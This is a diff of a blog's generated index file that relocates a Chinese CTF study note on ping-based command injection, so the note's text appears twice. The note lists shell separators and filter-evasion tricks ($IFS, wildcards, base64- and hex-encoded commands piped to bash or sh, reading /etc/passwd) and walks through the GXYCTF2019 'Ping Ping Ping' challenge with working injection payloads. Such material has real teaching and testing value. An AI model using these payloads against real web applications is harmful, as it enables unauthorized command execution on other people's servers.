@@ -96,175 +96,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Ping命令学习记录</title>
-    <url>/2024/03/09/Ping%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h1 id="Ping命令"><a href="#Ping命令" class="headerlink" title="Ping命令"></a>Ping命令</h1><h2 id="题目样式"><a href="#题目样式" class="headerlink" title="题目样式"></a>题目样式</h2><p>看到ping或者ping命令却没有waf时就要想到命令注入。</p>
-<h2 id="具体注入方法"><a href="#具体注入方法" class="headerlink" title="具体注入方法"></a>具体注入方法</h2><p>看到ping命令就可以利用截断来执行新的命令。</p>
-<span id="more"></span>
-
-<p>首先测试所有的截断符号：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$</span><br><span class="line">;</span><br><span class="line">|</span><br><span class="line">-</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">反引号</span><br><span class="line">||</span><br><span class="line">&amp;&amp;</span><br><span class="line">&amp;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure>
-
-<p><code>%0a</code>可以当作空格来用；<br>利用截断符号配合普通命令简单问题基本就出来；<br>例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;cat /home/flag.txt</span><br></pre></td></tr></table></figure>
-
-<p>简单的flag就出来了，也可以配合其他的进行。</p>
-<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><h3 id="分号用法"><a href="#分号用法" class="headerlink" title=";分号用法"></a><code>;</code>分号用法</h3><p>方式：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 ; command2</span><br></pre></td></tr></table></figure>
-
-<p>用<code>;</code>号隔开每个命令， 每个命令按照从左到右的<strong>顺序</strong>执行， 彼此之间不关心是否失败， 所有命令都会执行。</p>
-<h3 id="管道符用法"><a href="#管道符用法" class="headerlink" title="| 管道符用法"></a><code>| </code>管道符用法</h3><p>上一条命令的输出，作为下一条命令参数。</p>
-<p>CTF里面：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1 | ls</span><br></pre></td></tr></table></figure>
-
-<p>只执行ls不执行前面的<br>方式：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 | command</span><br></pre></td></tr></table></figure>
-
-<p>Linux所提供的管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入。<br>连续使用管道意味着第一个命令的输出会作为第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推。</p>
-<p>利用一个管道：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -qa|grep licq</span><br></pre></td></tr></table></figure>
-
-<p>这条命令使用一个管道符“|”建立了一个管道。管道将<code>rpm -qa</code>命令的输出（包括系统中所有安装的RPM包）作为<code>grep</code>命令的输入，从而列出带有<code>licq</code>字符的RPM包来。q表示查询query，a表示all。</p>
-<p>利用多个管道：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep /bin/bash | wc -l</span><br></pre></td></tr></table></figure>
-
-<p>这条命令使用了两个管道，利用第一个管道将cat命令（显示passwd文件的内容）的输出送给grep命令，grep命令找出含有“&#x2F;bin &#x2F;bash”的所有行；第二个管道将grep的输出送给wc命令，wc命令统计出输入中的行数。这个命令的功能在于找出系统中有多少个用户使用bash。</p>
-<h3 id="符号用法"><a href="#符号用法" class="headerlink" title="&amp;符号用法"></a><code>&amp;</code>符号用法</h3><p>ctf中用法 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1 &amp; ls</span><br></pre></td></tr></table></figure>
-
-<p>先执行<code>ls</code>后执行<code>ping</code></p>
-<p><code>&amp;</code>放在启动参数后面表示设置此进程为后台进程</p>
-<p>方式：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 &amp; command2</span><br></pre></td></tr></table></figure>
-
-<p>默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作。<br>对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个<code>&amp;</code>实现这个目的。</p>
-<h3 id="符号用法（与）"><a href="#符号用法（与）" class="headerlink" title="&amp;&amp;符号用法（与）"></a><code>&amp;&amp;</code>符号用法（与）</h3><p>ctf中用法 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1 &amp;&amp; ls</span><br></pre></td></tr></table></figure>
-
-<p><code>ping</code> 命令正确才执行 <code>ls</code> 要是 <code>ping 1 &amp;&amp; ls ls</code> 就不会执行</p>
-<p><code>shell</code> 在执行某个命令的时候，会返回一个返回值，该返回值保存在 <code>shell</code> 变量 <code>$?</code> 中。</p>
-<p>当 <code>$? == 0</code> 时，表示执行成功；<br>当 <code>$? == 1</code> 时（非0的数，返回值在0-255间），表示执行失败。</p>
-<p>有时候，下一条命令依赖前一条命令是否执行成功。</p>
-<p>如：在成功地执行一条命令之后再执行另一条命令，或者在一条命令执行失败后再执行另一条命令等。</p>
-<p>shell 提供了 <code>&amp;&amp;</code> 和 <code>||</code> 来实现命令执行控制的功能，shell 将根据 <code>&amp;&amp;</code> 或 <code>||</code> 前面命令的返回值来控制其后面命令的执行。</p>
-<p>语法格式如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 &amp;&amp; command2 [&amp;&amp; command3 …]</span><br></pre></td></tr></table></figure>
-
-<p>命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。</p>
-<p>只有在 &amp;&amp; 左边的命令返回真（命令返回值 <code>$? == 0</code>），<code>&amp;&amp;</code> 右边的命令才会被执行。<br>只要有一个命令返回假（命令返回值 <code>$? == 1</code>），后面的命令就不会被执行。</p>
-<h3 id="符号用法（或）"><a href="#符号用法（或）" class="headerlink" title="||符号用法（或）"></a><code>||</code>符号用法（或）</h3><p>和<code>&amp;&amp;</code>相反，左边为假才执行命令二</p>
-<p>语法格式如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 || command2 [|| command3 …]</span><br></pre></td></tr></table></figure>
-
-
-<p>命令之间使用 || 连接，实现逻辑或的功能。</p>
-<p>只有在 || 左边的命令返回假（命令返回值 $? &#x3D;&#x3D; 1），|| 右边的命令才会被执行。这和 c 语言中的逻辑或语法功能相同，即实现短路逻辑或操作。</p>
-<p>只要有一个命令返回真（命令返回值 $? &#x3D;&#x3D; 0），后面的命令就不会被执行。直到返回真的地方停止执行。</p>
-<p>举例，ping命令判断存活主机，注意 &amp;&gt;要连起来写</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping -c 1 -w 1 192.168.1.1 &amp;&gt; /dev/null &amp;&amp; result=0 ||result=1    if [ &quot;$result&quot; == 0 ];then    echo &quot;192.168.1.1 is UP!&quot;     else    echo &quot;192.168.2.1 is DOWN!&quot;   fi</span><br></pre></td></tr></table></figure>
-
-<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>linux下绕过空格</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09 </span><br></pre></td></tr></table></figure>
-
-<p>例如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br></pre></td></tr></table></figure>
-
-<p>\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg</span><br></pre></td></tr></table></figure>
-
-<h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><p><code>???</code>在linux里面可以进行代替字母</p>
-<p>比如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/???/c?t flag.txt</span><br></pre></td></tr></table></figure>
-
-<p><code>*</code>在linux里面可以进行模糊匹配</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat flag.* *</span><br></pre></td></tr></table></figure>
-
-<p>进行模糊匹配php</p>
-<h3 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤<code>cat</code></h3><p><code>cat</code>：由第一行开始显示内容，并将所有内容输出</p>
-<p><code>tac</code>：从最后一行倒序显示内容，并将所有内容输出</p>
-<p><code>more</code>：根据窗口大小，一页一页的现实文件内容</p>
-<p><code>less</code>和<code>more</code>类似，但其优点可以往前翻页，而且进行可以搜索字符</p>
-<p><code>head</code>：只显示头几行</p>
-<p><code>tail</code>：只显示最后几行</p>
-<p><code>nl</code>：类似于cat -n，显示时输出行号</p>
-<p><code>tailf</code>：类似于tail -f</p>
-<p><code>sort%20/flag</code> 读文件</p>
-<p><code>dir</code> 来查看当前目录文件</p>
-<p>也可以<code>c\at</code></p>
-<h3 id="Linux花式读取文件内容"><a href="#Linux花式读取文件内容" class="headerlink" title="Linux花式读取文件内容"></a>Linux花式读取文件内容</h3><p>ps:目标是获取flag.txt的内容</p>
-<h4 id="static-sh读取文件"><a href="#static-sh读取文件" class="headerlink" title="static-sh读取文件"></a><code>static-sh</code>读取文件</h4><p><code>static-sh ./flag.txt</code>等同于<code>/???/??????-?? ./flag.txt</code></p>
-<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">static-sh ./flag.txt</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">./flag.<span class="symbol">txt:</span> line <span class="number">1</span>: flag&#123;this_is_a_test&#125;: <span class="keyword">not</span> found</span><br><span class="line"><span class="comment"># 等同于</span></span><br><span class="line">/<span class="string">??</span><span class="string">?/</span><span class="string">??</span><span class="string">??</span><span class="string">??</span>-<span class="string">??</span> ./flag.txt</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">./flag.<span class="symbol">txt:</span> line <span class="number">1</span>: flag&#123;this_is_a_test&#125;: <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>
-
-<h4 id="paste读取文件"><a href="#paste读取文件" class="headerlink" title="paste读取文件"></a><code>paste</code>读取文件</h4><p><code>paste ./flag.txt /etc/passwd</code></p>
-<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">paste ./flag.txt /etc/passwd</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">flag&#123;this_is_a_test&#125;    <span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line">        <span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">        <span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">        <span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">        <span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br><span class="line">/<span class="regexp">/省略</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="diff读取文件"><a href="#diff读取文件" class="headerlink" title="diff读取文件"></a><code>diff</code>读取文件</h4><p><code>diff ./flag.txt /etc/passwd</code></p>
-<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">diff ./flag.txt /etc/passwd</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">1c1,<span class="number">45</span></span><br><span class="line">&lt; flag&#123;this_is_a_test&#125;</span><br><span class="line">\ <span class="title class_">No</span> newline at <span class="keyword">end</span> of file</span><br><span class="line">---</span><br><span class="line">&gt; <span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line">&gt; <span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">&gt; <span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">&gt; <span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">&gt; <span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="od读取文件"><a href="#od读取文件" class="headerlink" title="od读取文件"></a><code>od</code>读取文件</h4><p><code>od -a ./flag.txt</code></p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">od -<span class="selector-tag">a</span> ./flag<span class="selector-class">.txt</span></span><br><span class="line">#输出结果：</span><br><span class="line"><span class="number">0000000</span>   f   l   <span class="selector-tag">a</span>   g   &#123;   t   h   <span class="selector-tag">i</span>   s   _   <span class="selector-tag">i</span>   s   _   <span class="selector-tag">a</span>   _   t</span><br><span class="line"><span class="number">0000020</span>   e   s   t   &#125;</span><br><span class="line"><span class="number">0000024</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="bzmore读取文件"><a href="#bzmore读取文件" class="headerlink" title="bzmore读取文件"></a><code>bzmore</code>读取文件</h4><p><code>bzmore ./flag.txt</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bzmore ./flag.txt</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">------&gt; ./flag.txt &lt;------</span><br><span class="line">flag&#123;this_is_a_test&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="bzless读取文件"><a href="#bzless读取文件" class="headerlink" title="bzless读取文件"></a><code>bzless</code>读取文件</h4><p><code>bzless ./flag.txt</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> `bzless ./flag.txt`</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">------&gt; ./flag.txt &lt;------ flag&#123;this_is_a_test&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> YWJjZGU=|base64 -d </span><br><span class="line">    <span class="comment">//打印出来abcde</span></span><br><span class="line"><span class="keyword">echo</span> Y2F0IGZsYWcucGhw|base64 -d|bash </span><br><span class="line">    <span class="comment">//cat flag.php</span></span><br><span class="line"><span class="keyword">echo</span> Y2F0IGZsYWcucGhw|base64 -d|sh </span><br><span class="line">    <span class="comment">//cat flag.php</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">63617420666</span>c61672e706870 | xxd -r -p|bash <span class="comment">//cat flag.php</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$(printf “\<span class="number">154</span>\<span class="number">163</span>”) </span><br><span class="line">    <span class="comment">//ls</span></span><br><span class="line">$(printf “\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70”) </span><br><span class="line">    <span class="comment">//cat flag.php</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤;"></a>过滤<code>;</code></h3><h2 id="例题及详解"><a href="#例题及详解" class="headerlink" title="例题及详解"></a>例题及详解</h2><p>[GXYCTF2019]Ping Ping Ping</p>
-<p><img src="https://s2.loli.net/2023/11/20/mJixQ7jw4ukMNZn.png" alt="image-20231103224815525"></p>
-<p>打开靶机，发现提示用GET方法进行Ping命令注入</p>
-<p>构造<code>?ip=127.0.0.1;ls</code></p>
-<p><img src="https://s2.loli.net/2023/11/20/O9nWgscwGiC2Ldp.png" alt="image-20231103224922092"></p>
-<p>发现两个php文件</p>
-<p>构造<code>?ip=127.0.0.1;cat index.php</code>（一般题目不会直接让你出flag，估计里面是各种过滤）</p>
-<p><img src="https://s2.loli.net/2023/11/20/Z9PV3Ws8LJag6Kc.png" alt="image-20231103225231785"></p>
-<p>发现空格被过滤，用<code>$IFS$1</code>绕过，但是无回显</p>
-<p><img src="https://s2.loli.net/2023/11/20/uHCFWkieYcdxE4r.png" alt="image-20231103225717344"></p>
-<p>总结：过滤的特殊字符：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp; / ？ * &lt; x&#123;00&#125;-\x&#123;1f&#125; &#x27; &quot; \ () [] &#123;&#125;  空格</span><br><span class="line">&quot;xxxfxxxlxxxaxxxgxxx&quot; &quot; &quot; &quot;bash&quot; </span><br></pre></td></tr></table></figure>
-
-<p>flag的贪婪匹配，匹配一个字符串中，是否按顺序出现过flag四个字母</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>但仔细观察源码发现有一个$a变量可以覆盖</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=f;cat$IFS$1$alag.php    过滤</span><br><span class="line">?ip=127.0.0.1;a=l;cat$IFS$1f$aag.php	没flag</span><br><span class="line">?ip=127.0.0.1;a=a;cat$IFS$1fl$ag.php  	过滤</span><br><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php	有flag</span><br><span class="line">?ip=127.0.0.1;a=fl;b=ag;cat$IFS$1$a$b.php 过滤</span><br><span class="line">?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php 有flag</span><br></pre></td></tr></table></figure>
-
-<p>变量替换顺序，效果也不一样</p>
-<h3 id="简单变量替换，用-a覆盖拼接flag"><a href="#简单变量替换，用-a覆盖拼接flag" class="headerlink" title="简单变量替换，用$a覆盖拼接flag"></a>简单变量替换，用$a覆盖拼接flag</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br><span class="line">查看源码</span><br></pre></td></tr></table></figure>
-
-<h3 id="变量ab互换传递，绕过字符串匹配，实现拼接"><a href="#变量ab互换传递，绕过字符串匹配，实现拼接" class="headerlink" title="变量ab互换传递，绕过字符串匹配，实现拼接"></a>变量ab互换传递，绕过字符串匹配，实现拼接</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;b=lag;a=f;cat$IFS$a$b.php</span><br></pre></td></tr></table></figure>
-
-<h3 id="被过滤的bash，用管道-sh替换"><a href="#被过滤的bash，用管道-sh替换" class="headerlink" title="被过滤的bash，用管道+sh替换"></a>被过滤的bash，用管道+sh替换</h3><p><code>cat flag.php</code>用base64加密来绕过正则匹配</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</span><br></pre></td></tr></table></figure>
-
-<p>过滤了flag、bash，但sh没过滤，linux下可用sh</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
-
-<p><code>|sh</code> 就是执行前面的echo脚本</p>
-<h3 id="类似题的大概思路"><a href="#类似题的大概思路" class="headerlink" title="类似题的大概思路"></a>类似题的大概思路</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat fl*  用*匹配任意 </span><br><span class="line">cat fla* 用*匹配任意</span><br><span class="line">ca\t fla\g.php        反斜线绕过</span><br><span class="line">cat fl&#x27;&#x27;ag.php        两个单引号绕过</span><br><span class="line">echo &quot;Y2F0IGZsYWcucGhw&quot; | base64 -d | bash      </span><br><span class="line">//base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数</span><br><span class="line"></span><br><span class="line">echo &quot;63617420666c61672e706870&quot; | xxd -r -p | bash       </span><br><span class="line">//hex编码绕过(引号可以去掉)</span><br><span class="line"></span><br><span class="line">echo &quot;63617420666c61672e706870&quot; | xxd -r -p | sh     </span><br><span class="line">//sh的效果和bash一样</span><br><span class="line"></span><br><span class="line">cat fl[a]g.php       用[]匹配</span><br><span class="line"></span><br><span class="line">a=fl;b=ag;cat $a$b          变量替换</span><br><span class="line">cp fla&#123;g.php,G&#125;    把flag.php复制为flaG</span><br><span class="line">ca$&#123;21&#125;t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 </span><br></pre></td></tr></table></figure>
-
-<p>通配符</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">*       <span class="comment">#匹配全部字符，通配符</span></span><br><span class="line">?       <span class="comment">#任意一个字符，通配符</span></span><br><span class="line">[]      <span class="comment">#表示一个范围（正则，通配符）</span></span><br><span class="line">&#123;&#125;      <span class="comment">#产生一个序列（通配符）</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/11/20/2UfKa9yFiozxOg8.png" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>命令执行</category>
-      </categories>
-      <tags>
-        <tag>命令执行</tag>
-        <tag>Ping</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>XXE学习记录</title>
     <url>/2024/03/11/XXE%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<p>前言：</p>
@@ -659,6 +490,175 @@
       </tags>
   </entry>
   <entry>
+    <title>Ping命令学习记录</title>
+    <url>/2024/03/09/Ping%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h1 id="Ping命令"><a href="#Ping命令" class="headerlink" title="Ping命令"></a>Ping命令</h1><h2 id="题目样式"><a href="#题目样式" class="headerlink" title="题目样式"></a>题目样式</h2><p>看到ping或者ping命令却没有waf时就要想到命令注入。</p>
+<h2 id="具体注入方法"><a href="#具体注入方法" class="headerlink" title="具体注入方法"></a>具体注入方法</h2><p>看到ping命令就可以利用截断来执行新的命令。</p>
+<span id="more"></span>
+
+<p>首先测试所有的截断符号：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$</span><br><span class="line">;</span><br><span class="line">|</span><br><span class="line">-</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">反引号</span><br><span class="line">||</span><br><span class="line">&amp;&amp;</span><br><span class="line">&amp;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure>
+
+<p><code>%0a</code>可以当作空格来用；<br>利用截断符号配合普通命令简单问题基本就出来；<br>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;cat /home/flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>简单的flag就出来了，也可以配合其他的进行。</p>
+<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><h3 id="分号用法"><a href="#分号用法" class="headerlink" title=";分号用法"></a><code>;</code>分号用法</h3><p>方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 ; command2</span><br></pre></td></tr></table></figure>
+
+<p>用<code>;</code>号隔开每个命令， 每个命令按照从左到右的<strong>顺序</strong>执行， 彼此之间不关心是否失败， 所有命令都会执行。</p>
+<h3 id="管道符用法"><a href="#管道符用法" class="headerlink" title="| 管道符用法"></a><code>| </code>管道符用法</h3><p>上一条命令的输出，作为下一条命令参数。</p>
+<p>CTF里面：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1 | ls</span><br></pre></td></tr></table></figure>
+
+<p>只执行ls不执行前面的<br>方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 | command</span><br></pre></td></tr></table></figure>
+
+<p>Linux所提供的管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入。<br>连续使用管道意味着第一个命令的输出会作为第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推。</p>
+<p>利用一个管道：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -qa|grep licq</span><br></pre></td></tr></table></figure>
+
+<p>这条命令使用一个管道符“|”建立了一个管道。管道将<code>rpm -qa</code>命令的输出（包括系统中所有安装的RPM包）作为<code>grep</code>命令的输入，从而列出带有<code>licq</code>字符的RPM包来。q表示查询query，a表示all。</p>
+<p>利用多个管道：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep /bin/bash | wc -l</span><br></pre></td></tr></table></figure>
+
+<p>这条命令使用了两个管道，利用第一个管道将cat命令（显示passwd文件的内容）的输出送给grep命令，grep命令找出含有“&#x2F;bin &#x2F;bash”的所有行；第二个管道将grep的输出送给wc命令，wc命令统计出输入中的行数。这个命令的功能在于找出系统中有多少个用户使用bash。</p>
+<h3 id="符号用法"><a href="#符号用法" class="headerlink" title="&amp;符号用法"></a><code>&amp;</code>符号用法</h3><p>ctf中用法 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1 &amp; ls</span><br></pre></td></tr></table></figure>
+
+<p>先执行<code>ls</code>后执行<code>ping</code></p>
+<p><code>&amp;</code>放在启动参数后面表示设置此进程为后台进程</p>
+<p>方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 &amp; command2</span><br></pre></td></tr></table></figure>
+
+<p>默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作。<br>对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个<code>&amp;</code>实现这个目的。</p>
+<h3 id="符号用法（与）"><a href="#符号用法（与）" class="headerlink" title="&amp;&amp;符号用法（与）"></a><code>&amp;&amp;</code>符号用法（与）</h3><p>ctf中用法 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1 &amp;&amp; ls</span><br></pre></td></tr></table></figure>
+
+<p><code>ping</code> 命令正确才执行 <code>ls</code> 要是 <code>ping 1 &amp;&amp; ls ls</code> 就不会执行</p>
+<p><code>shell</code> 在执行某个命令的时候，会返回一个返回值，该返回值保存在 <code>shell</code> 变量 <code>$?</code> 中。</p>
+<p>当 <code>$? == 0</code> 时，表示执行成功；<br>当 <code>$? == 1</code> 时（非0的数，返回值在0-255间），表示执行失败。</p>
+<p>有时候，下一条命令依赖前一条命令是否执行成功。</p>
+<p>如：在成功地执行一条命令之后再执行另一条命令，或者在一条命令执行失败后再执行另一条命令等。</p>
+<p>shell 提供了 <code>&amp;&amp;</code> 和 <code>||</code> 来实现命令执行控制的功能，shell 将根据 <code>&amp;&amp;</code> 或 <code>||</code> 前面命令的返回值来控制其后面命令的执行。</p>
+<p>语法格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 &amp;&amp; command2 [&amp;&amp; command3 …]</span><br></pre></td></tr></table></figure>
+
+<p>命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。</p>
+<p>只有在 &amp;&amp; 左边的命令返回真（命令返回值 <code>$? == 0</code>），<code>&amp;&amp;</code> 右边的命令才会被执行。<br>只要有一个命令返回假（命令返回值 <code>$? == 1</code>），后面的命令就不会被执行。</p>
+<h3 id="符号用法（或）"><a href="#符号用法（或）" class="headerlink" title="||符号用法（或）"></a><code>||</code>符号用法（或）</h3><p>和<code>&amp;&amp;</code>相反，左边为假才执行命令二</p>
+<p>语法格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 || command2 [|| command3 …]</span><br></pre></td></tr></table></figure>
+
+
+<p>命令之间使用 || 连接，实现逻辑或的功能。</p>
